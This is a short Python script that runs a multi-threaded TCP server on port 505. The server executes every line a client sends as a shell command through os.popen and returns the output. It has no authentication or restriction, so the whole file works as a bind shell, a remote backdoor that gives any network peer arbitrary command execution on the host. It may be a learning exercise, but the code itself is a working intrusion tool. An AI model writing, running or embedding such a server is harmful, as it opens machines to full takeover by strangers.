import socket
import os
import threading
def new_client(c,addr):
    while True:
        com=c.recv(1024).decode().strip()
        if (com == "bye"):
            c.send("goodbye".encode())
            break
        try:
            res = os.popen(com).read()
            c.send(res.encode())
            print("success!!!")
        except:
            c.send("Unrecognized command try again!".encode())
    c.close()
s=socket.socket()
host=socket.gethostname()
port=505
print("Server started!\n waiting for clients...")
s.bind((host,port))
s.listen(5)

while True:
    c, addr=s.accept()
    print(f"{addr} connected")
    threading.Thread(target=new_client,args=(c,addr)).start()
s.close()
